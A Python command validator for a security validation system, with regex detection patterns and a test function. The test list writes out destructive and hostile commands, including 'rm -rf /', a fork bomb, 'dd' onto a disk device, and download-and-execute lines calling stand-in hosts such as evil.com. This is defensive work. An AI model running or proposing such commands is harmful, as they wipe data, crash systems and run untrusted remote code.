#!/usr/bin/env python3
"""
Command Validator for Security Validation System
Validates commands for dangerous patterns, injection attempts, and security compliance
"""

import re
import logging
import shlex
from typing import List, Dict, Any, Optional, Set
from dataclasses import dataclass
from enum import Enum
import subprocess
import os

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class CommandSeverity(Enum):
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class CommandThreatType(Enum):
    DANGEROUS_COMMAND = "dangerous_command"
    INJECTION_ATTEMPT = "injection_attempt"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DATA_DESTRUCTION = "data_destruction"
    NETWORK_ACCESS = "network_access"
    SYSTEM_MODIFICATION = "system_modification"
    SUSPICIOUS_PATTERN = "suspicious_pattern"

@dataclass
class CommandThreat:
    threat_type: CommandThreatType
    severity: CommandSeverity
    pattern_name: str
    matched_part: str
    description: str
    suggestion: str = ""
    confidence: float = 1.0
    metadata: Dict[str, Any] = None

    def __post_init__(self):
        if self.metadata is None:
            self.metadata = {}

@dataclass
class CommandValidationResult:
    allowed: bool
    command: str
    threats: List[CommandThreat]
    risk_score: float
    sanitized_command: Optional[str] = None
    alternative_suggestions: List[str] = None
    metadata: Dict[str, Any] = None

    def __post_init__(self):
        if self.alternative_suggestions is None:
            self.alternative_suggestions = []
        if self.metadata is None:
            self.metadata = {}
        
        # Calculate risk score from threats
        if self.threats:
            severity_weights = {
                CommandSeverity.INFO: 0.1,
                CommandSeverity.LOW: 0.3,
                CommandSeverity.MEDIUM: 0.6,
                CommandSeverity.HIGH: 0.8,
                CommandSeverity.CRITICAL: 1.0
            }
            
            total_risk = sum(severity_weights[threat.severity] * threat.confidence for threat in self.threats)
            self.risk_score = min(1.0, total_risk / len(self.threats))

class CommandValidator:
    """Validates commands for security compliance"""
    
    def __init__(self):
        # Extremely dangerous commands that should never be executed
        self.critical_patterns = {
            'rm_recursive': {
                'pattern': r'rm\s+(-[rf]*[rf][rf]*\s+)?(/|\$HOME|\~|\*|\.\.)',
                'severity': CommandSeverity.CRITICAL,
                'description': 'Dangerous recursive removal command',
                'threat_type': CommandThreatType.DATA_DESTRUCTION
            },
            'format_command': {
                'pattern': r'(format|fdisk|mkfs)\s+',
                'severity': CommandSeverity.CRITICAL,
                'description': 'Disk formatting command detected',
                'threat_type': CommandThreatType.DATA_DESTRUCTION
            },
            'fork_bomb': {
                'pattern': r':\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:',
                'severity': CommandSeverity.CRITICAL,
                'description': 'Fork bomb pattern detected',
                'threat_type': CommandThreatType.SYSTEM_MODIFICATION
            },
            'dd_destructive': {
                'pattern': r'dd\s+.*of=/dev/(sd[a-z]|hd[a-z]|nvme[0-9])',
                'severity': CommandSeverity.CRITICAL,
                'description': 'Destructive dd command to disk device',
                'threat_type': CommandThreatType.DATA_DESTRUCTION
            },
            'shutdown_reboot': {
                'pattern': r'(shutdown|reboot|halt|poweroff)\s+',
                'severity': CommandSeverity.HIGH,
                'description': 'System shutdown/reboot command',
                'threat_type': CommandThreatType.SYSTEM_MODIFICATION
            }
        }
        
        # High-risk patterns
        self.high_risk_patterns = {
            'sudo_usage': {
                'pattern': r'sudo\s+',
                'severity': CommandSeverity.HIGH,
                'description': 'Privilege escalation with sudo',
                'threat_type': CommandThreatType.PRIVILEGE_ESCALATION
            },
            'chmod_777': {
                'pattern': r'chmod\s+777',
                'severity': CommandSeverity.HIGH,
                'description': 'Setting dangerous file permissions (777)',
                'threat_type': CommandThreatType.SYSTEM_MODIFICATION
            },
            'chown_recursive': {
                'pattern': r'chown\s+-R\s+root',
                'severity': CommandSeverity.HIGH,
                'description': 'Recursive ownership change to root',
                'threat_type': CommandThreatType.PRIVILEGE_ESCALATION
            },
            'wget_execute': {
                'pattern': r'(wget|curl).*\|\s*(sh|bash|python)',
                'severity': CommandSeverity.HIGH,
                'description': 'Download and execute pattern',
                'threat_type': CommandThreatType.NETWORK_ACCESS
            },
            'nc_backdoor': {
                'pattern': r'nc\s+.*-[el].*',
                'severity': CommandSeverity.HIGH,
                'description': 'Netcat backdoor pattern',
                'threat_type': CommandThreatType.NETWORK_ACCESS
            }
        }
        
        # Medium-risk patterns
        self.medium_risk_patterns = {
            'eval_usage': {
                'pattern': r'eval\s+',
                'severity': CommandSeverity.MEDIUM,
                'description': 'Use of eval command',
                'threat_type': CommandThreatType.INJECTION_ATTEMPT
            },
            'find_exec': {
                'pattern': r'find\s+.*-exec\s+',
                'severity': CommandSeverity.MEDIUM,
                'description': 'Find command with exec',
                'threat_type': CommandThreatType.DANGEROUS_COMMAND
            },
            'crontab_modification': {
                'pattern': r'crontab\s+',
                'severity': CommandSeverity.MEDIUM,
                'description': 'Crontab modification',
                'threat_type': CommandThreatType.SYSTEM_MODIFICATION
            },
            'history_manipulation': {
                'pattern': r'history\s+(-c|-d)',
                'severity': CommandSeverity.MEDIUM,
                'description': 'Command history manipulation',
                'threat_type': CommandThreatType.SUSPICIOUS_PATTERN
            },
            'base64_decode': {
                'pattern': r'base64\s+(-d|--decode)',
                'severity': CommandSeverity.LOW,
                'description': 'Base64 decoding (potential obfuscation)',
                'threat_type': CommandThreatType.SUSPICIOUS_PATTERN
            }
        }
        
        # Injection patterns
        self.injection_patterns = {
            'command_injection_semicolon': {
                'pattern': r';\s*(rm|cat|ls|wget|curl|nc)',
                'severity': CommandSeverity.HIGH,
                'description': 'Command injection with semicolon',
                'threat_type': CommandThreatType.INJECTION_ATTEMPT
            },
            'command_injection_pipe': {
                'pattern': r'\|\s*(rm|dd|format|shutdown)',
                'severity': CommandSeverity.HIGH,
                'description': 'Command injection with pipe',
                'threat_type': CommandThreatType.INJECTION_ATTEMPT
            },
            'command_injection_and': {
                'pattern': r'&&\s*(rm|dd|format|shutdown)',
                'severity': CommandSeverity.HIGH,
                'description': 'Command injection with logical AND',
                'threat_type': CommandThreatType.INJECTION_ATTEMPT
            },
            'command_injection_backtick': {
                'pattern': r'`[^`]*`',
                'severity': CommandSeverity.MEDIUM,
                'description': 'Command substitution with backticks',
                'threat_type': CommandThreatType.INJECTION_ATTEMPT
            },
            'command_injection_dollar': {
                'pattern': r'\$\([^)]*\)',
                'severity': CommandSeverity.MEDIUM,
                'description': 'Command substitution with $(...)',
                'threat_type': CommandThreatType.INJECTION_ATTEMPT
            }
        }
        
        # Allowed commands whitelist
        self.allowed_commands = {
            # File operations
            'ls', 'cat', 'head', 'tail', 'grep', 'find', 'sort', 'uniq', 'wc',
            'cp', 'mv', 'mkdir', 'rmdir', 'touch', 'ln',
            
            # Text processing
            'sed', 'awk', 'cut', 'tr', 'paste', 'join',
            
            # Archive operations
            'tar', 'gzip', 'gunzip', 'zip', 'unzip',
            
            # Development tools
            'git', 'python', 'python3', 'pip', 'npm', 'node', 'java', 'javac',
            'gcc', 'make', 'cmake', 'cargo', 'rustc',
            
            # Package managers
            'apt', 'yum', 'brew', 'pip', 'npm', 'yarn', 'composer',
            
            # System info (safe)
            'ps', 'top', 'df', 'du', 'free', 'uname', 'whoami', 'id',
            'date', 'uptime', 'hostname',
            
            # Network (limited)
            'ping', 'traceroute', 'nslookup', 'dig',
            
            # Text editors
            'vim', 'nano', 'emacs', 'code'
        }
        
        # Commands that require special validation
        self.restricted_commands = {
            'curl', 'wget', 'nc', 'telnet', 'ssh', 'scp', 'rsync',
            'chmod', 'chown', 'chgrp', 'su', 'sudo',
            'rm', 'rmdir', 'dd', 'mount', 'umount'
        }
        
        # Network-related commands that need scrutiny
        self.network_commands = {
            'curl', 'wget', 'nc', 'netcat', 'telnet', 'ftp', 'sftp',
            'ssh', 'scp', 'rsync', 'ping', 'traceroute', 'nslookup', 'dig'
        }
        
        logger.info("Command validator initialized")
    
    def validate_command(self, command: str) -> CommandValidationResult:
        """Validate a command for security issues"""
        
        threats = []
        
        # Clean and normalize command
        normalized_command = self.normalize_command(command)
        
        # Parse command to extract components
        command_parts = self.parse_command(normalized_command)
        
        # Check against critical patterns
        threats.extend(self.check_critical_patterns(normalized_command))
        
        # Check against high-risk patterns
        threats.extend(self.check_high_risk_patterns(normalized_command))
        
        # Check against medium-risk patterns
        threats.extend(self.check_medium_risk_patterns(normalized_command))
        
        # Check for injection patterns
        threats.extend(self.check_injection_patterns(normalized_command))
        
        # Validate individual command components
        threats.extend(self.validate_command_components(command_parts))
        
        # Check for suspicious command combinations
        threats.extend(self.check_suspicious_combinations(command_parts))
        
        # Determine if command is allowed
        allowed = self.determine_allowance(threats, command_parts)
        
        # Generate sanitized version if possible
        sanitized_command = self.generate_sanitized_command(normalized_command, threats) if not allowed else None
        
        # Generate alternative suggestions
        alternatives = self.generate_alternatives(normalized_command, threats)
        
        result = CommandValidationResult(
            allowed=allowed,
            command=normalized_command,
            threats=threats,
            risk_score=0.0,  # Will be calculated in __post_init__
            sanitized_command=sanitized_command,
            alternative_suggestions=alternatives,
            metadata={
                'original_command': command,
                'command_parts': command_parts,
                'validation_timestamp': __import__('time').time()
            }
        )
        
        logger.info(f"Command validation completed: {len(threats)} threats, allowed: {allowed}")
        
        return result
    
    def normalize_command(self, command: str) -> str:
        """Normalize command for consistent analysis"""
        
        # Remove leading/trailing whitespace
        command = command.strip()
        
        # Normalize multiple spaces
        command = re.sub(r'\s+', ' ', command)
        
        # Remove comments (but preserve # in quotes)
        command = re.sub(r'#.*$', '', command)
        
        return command
    
    def parse_command(self, command: str) -> Dict[str, Any]:
        """Parse command into components"""
        
        try:
            # Use shlex to properly parse the command
            tokens = shlex.split(command)
        except ValueError:
            # If parsing fails, fall back to simple split
            tokens = command.split()
        
        if not tokens:
            return {'base_command': '', 'args': [], 'pipes': [], 'redirects': []}
        
        # Extract base command
        base_command = tokens[0] if tokens else ''
        
        # Extract arguments
        args = tokens[1:] if len(tokens) > 1 else []
        
        # Find pipes
        pipes = []
        if '|' in command:
            pipe_commands = command.split('|')
            pipes = [cmd.strip() for cmd in pipe_commands[1:]]
        
        # Find redirects
        redirects = []
        redirect_patterns = [r'>\s*([^\s]+)', r'>>\s*([^\s]+)', r'<\s*([^\s]+)']
        for pattern in redirect_patterns:
            matches = re.findall(pattern, command)
            redirects.extend(matches)
        
        return {
            'base_command': base_command,
            'args': args,
            'pipes': pipes,
            'redirects': redirects,
            'full_tokens': tokens
        }
    
    def check_critical_patterns(self, command: str) -> List[CommandThreat]:
        """Check for critical security threats"""
        
        threats = []
        
        for pattern_name, pattern_config in self.critical_patterns.items():
            pattern = pattern_config['pattern']
            matches = re.finditer(pattern, command, re.IGNORECASE)
            
            for match in matches:
                threats.append(CommandThreat(
                    threat_type=pattern_config['threat_type'],
                    severity=pattern_config['severity'],
                    pattern_name=pattern_name,
                    matched_part=match.group(),
                    description=pattern_config['description'],
                    suggestion=self.get_threat_suggestion(pattern_name),
                    confidence=0.95,
                    metadata={'match_position': match.span()}
                ))
        
        return threats
    
    def check_high_risk_patterns(self, command: str) -> List[CommandThreat]:
        """Check for high-risk patterns"""
        
        threats = []
        
        for pattern_name, pattern_config in self.high_risk_patterns.items():
            pattern = pattern_config['pattern']
            matches = re.finditer(pattern, command, re.IGNORECASE)
            
            for match in matches:
                threats.append(CommandThreat(
                    threat_type=pattern_config['threat_type'],
                    severity=pattern_config['severity'],
                    pattern_name=pattern_name,
                    matched_part=match.group(),
                    description=pattern_config['description'],
                    suggestion=self.get_threat_suggestion(pattern_name),
                    confidence=0.85,
                    metadata={'match_position': match.span()}
                ))
        
        return threats
    
    def check_medium_risk_patterns(self, command: str) -> List[CommandThreat]:
        """Check for medium-risk patterns"""
        
        threats = []
        
        for pattern_name, pattern_config in self.medium_risk_patterns.items():
            pattern = pattern_config['pattern']
            matches = re.finditer(pattern, command, re.IGNORECASE)
            
            for match in matches:
                threats.append(CommandThreat(
                    threat_type=pattern_config['threat_type'],
                    severity=pattern_config['severity'],
                    pattern_name=pattern_name,
                    matched_part=match.group(),
                    description=pattern_config['description'],
                    suggestion=self.get_threat_suggestion(pattern_name),
                    confidence=0.75,
                    metadata={'match_position': match.span()}
                ))
        
        return threats
    
    def check_injection_patterns(self, command: str) -> List[CommandThreat]:
        """Check for command injection patterns"""
        
        threats = []
        
        for pattern_name, pattern_config in self.injection_patterns.items():
            pattern = pattern_config['pattern']
            matches = re.finditer(pattern, command, re.IGNORECASE)
            
            for match in matches:
                threats.append(CommandThreat(
                    threat_type=pattern_config['threat_type'],
                    severity=pattern_config['severity'],
                    pattern_name=pattern_name,
                    matched_part=match.group(),
                    description=pattern_config['description'],
                    suggestion=self.get_threat_suggestion(pattern_name),
                    confidence=0.80,
                    metadata={'match_position': match.span()}
                ))
        
        return threats
    
    def validate_command_components(self, command_parts: Dict[str, Any]) -> List[CommandThreat]:
        """Validate individual command components"""
        
        threats = []
        base_command = command_parts['base_command']
        
        # Check if base command is explicitly blocked
        if base_command in ['rm', 'rmdir'] and any('-r' in arg or '-f' in arg for arg in command_parts['args']):
            threats.append(CommandThreat(
                threat_type=CommandThreatType.DATA_DESTRUCTION,
                severity=CommandSeverity.HIGH,
                pattern_name='rm_with_flags',
                matched_part=f"{base_command} {' '.join(command_parts['args'])}",
                description='Recursive or forced removal command',
                suggestion='Use specific file paths and avoid -rf flags',
                confidence=0.9
            ))
        
        # Check network commands
        if base_command in self.network_commands:
            threats.append(CommandThreat(
                threat_type=CommandThreatType.NETWORK_ACCESS,
                severity=CommandSeverity.MEDIUM,
                pattern_name='network_command',
                matched_part=base_command,
                description='Network access command detected',
                suggestion='Ensure network access is necessary and secure',
                confidence=0.6
            ))
        
        # Check restricted commands
        if base_command in self.restricted_commands:
            threats.append(CommandThreat(
                threat_type=CommandThreatType.DANGEROUS_COMMAND,
                severity=CommandSeverity.MEDIUM,
                pattern_name='restricted_command',
                matched_part=base_command,
                description='Restricted command requires validation',
                suggestion='Review command necessity and parameters',
                confidence=0.7
            ))
        
        return threats
    
    def check_suspicious_combinations(self, command_parts: Dict[str, Any]) -> List[CommandThreat]:
        """Check for suspicious command combinations"""
        
        threats = []
        full_command = ' '.join(command_parts['full_tokens'])
        
        # Check for download and execute patterns
        if any(cmd in full_command for cmd in ['wget', 'curl']) and any(exec_cmd in full_command for exec_cmd in ['sh', 'bash', 'python']):
            threats.append(CommandThreat(
                threat_type=CommandThreatType.NETWORK_ACCESS,
                severity=CommandSeverity.HIGH,
                pattern_name='download_execute',
                matched_part='download and execute pattern',
                description='Command downloads and executes content',
                suggestion='Review downloaded content before execution',
                confidence=0.85
            ))
        
        # Check for privilege escalation chains
        if 'sudo' in full_command and any(dangerous in full_command for dangerous in ['rm', 'chmod', 'chown']):
            threats.append(CommandThreat(
                threat_type=CommandThreatType.PRIVILEGE_ESCALATION,
                severity=CommandSeverity.HIGH,
                pattern_name='sudo_dangerous',
                matched_part='sudo with dangerous command',
                description='Privilege escalation with dangerous command',
                suggestion='Minimize sudo usage and validate operations',
                confidence=0.8
            ))
        
        return threats
    
    def determine_allowance(self, threats: List[CommandThreat], command_parts: Dict[str, Any]) -> bool:
        """Determine if command should be allowed based on threats"""
        
        # Block any command with CRITICAL threats
        if any(threat.severity == CommandSeverity.CRITICAL for threat in threats):
            return False
        
        # Count HIGH severity threats
        high_threats = [t for t in threats if t.severity == CommandSeverity.HIGH]
        
        # Block commands with multiple HIGH threats
        if len(high_threats) >= 2:
            return False
        
        # Block specific high-risk combinations
        base_command = command_parts.get('base_command', '')
        
        # Always block unknown commands that aren't in allowed list
        if base_command and base_command not in self.allowed_commands and base_command not in self.restricted_commands:
            # Check if it's a path to an executable
            if '/' in base_command:
                return False  # Block execution of arbitrary paths
        
        # Allow commands with only LOW/MEDIUM threats (with warnings)
        return True
    
    def generate_sanitized_command(self, command: str, threats: List[CommandThreat]) -> Optional[str]:
        """Generate a sanitized version of the command if possible"""
        
        sanitized = command
        
        # Remove dangerous flags
        dangerous_flags = ['-rf', '-f', '--force', '--recursive']
        for flag in dangerous_flags:
            sanitized = sanitized.replace(flag, '')
        
        # Remove sudo if present
        sanitized = re.sub(r'\bsudo\s+', '', sanitized)
        
        # Remove command injection attempts
        injection_chars = [';', '|', '&&', '||']
        for char in injection_chars:
            if char in sanitized:
                sanitized = sanitized.split(char)[0]  # Take only the first part
        
        # Clean up extra spaces
        sanitized = re.sub(r'\s+', ' ', sanitized).strip()
        
        # If sanitized version is too different or still dangerous, return None
        if len(sanitized) < len(command) * 0.5 or not sanitized:
            return None
        
        return sanitized
    
    def generate_alternatives(self, command: str, threats: List[CommandThreat]) -> List[str]:
        """Generate alternative safer commands"""
        
        alternatives = []
        
        # Common dangerous command alternatives
        if 'rm -rf' in command:
            alternatives.extend([
                "Move files to trash instead of permanent deletion",
                "Use 'rm' without -rf flags for specific files",
                "Use version control to track deletions"
            ])
        
        if 'curl' in command and '|' in command:
            alternatives.extend([
                "Download file first, then inspect before execution",
                "Use package managers instead of direct downloads",
                "Verify checksums and signatures"
            ])
        
        if 'sudo' in command:
            alternatives.extend([
                "Use user-level alternatives when possible",
                "Configure sudo for specific commands only",
                "Use proper permission management"
            ])
        
        # Add general alternatives
        if threats:
            alternatives.extend([
                "Review command necessity and safety",
                "Use safer alternatives from allowed command list",
                "Run commands in isolated environment first"
            ])
        
        return alternatives
    
    def get_threat_suggestion(self, pattern_name: str) -> str:
        """Get specific suggestion for a threat pattern"""
        
        suggestions = {
            'rm_recursive': 'Use specific file paths instead of wildcards',
            'format_command': 'This operation is extremely dangerous',
            'fork_bomb': 'This pattern can crash the system',
            'sudo_usage': 'Minimize privilege escalation',
            'wget_execute': 'Download and verify before executing',
            'eval_usage': 'Use safer alternatives to eval',
            'command_injection_semicolon': 'Validate all input parameters'
        }
        
        return suggestions.get(pattern_name, 'Review this pattern for security implications')
    
    def is_command_safe(self, command: str) -> bool:
        """Quick check if a command is considered safe"""
        
        result = self.validate_command(command)
        return result.allowed and result.risk_score < 0.5

# Example usage and testing
def test_command_validator():
    """Test the command validator functionality"""
    
    validator = CommandValidator()
    
    # Test commands with various security levels
    test_commands = [
        # Safe commands
        "ls -la",
        "cat file.txt",
        "python script.py",
        "git status",
        
        # Risky but allowable
        "curl https://example.com/file.txt",
        "find . -name '*.py'",
        "chmod 644 file.txt",
        
        # Dangerous commands
        "rm -rf /",
        "sudo rm -rf /*",
        "wget http://malicious.com/script.sh | sh",
        "eval $(curl http://evil.com)",
        ":(){ :|:& };:",  # Fork bomb
        "dd if=/dev/zero of=/dev/sda",
        
        # Injection attempts
        "ls; rm -rf /tmp",
        "cat file.txt && shutdown -h now",
        "echo `rm -rf ~`",
        "find . -exec rm {} \\;"
    ]
    
    print("🧪 Testing Command Validator...")
    print("=" * 60)
    
    safe_count = 0
    blocked_count = 0
    
    for command in test_commands:
        result = validator.validate_command(command)
        
        status = "✅ ALLOWED" if result.allowed else "🚫 BLOCKED"
        risk_indicator = "🔴" if result.risk_score > 0.7 else "🟡" if result.risk_score > 0.3 else "🟢"
        
        print(f"{status} {risk_indicator} Risk: {result.risk_score:.2f}")
        print(f"  Command: {command}")
        
        if result.threats:
            print(f"  Threats ({len(result.threats)}):")
            for threat in result.threats[:3]:  # Show first 3 threats
                print(f"    {threat.severity.value.upper()}: {threat.description}")
        
        if result.alternative_suggestions:
            print(f"  Alternatives: {result.alternative_suggestions[0]}")
        
        print()
        
        if result.allowed:
            safe_count += 1
        else:
            blocked_count += 1
    
    print(f"📊 Summary: {safe_count} allowed, {blocked_count} blocked")
    print(f"🛡️ Protection rate: {(blocked_count / len(test_commands)) * 100:.1f}%")

if __name__ == "__main__":
    test_command_validator()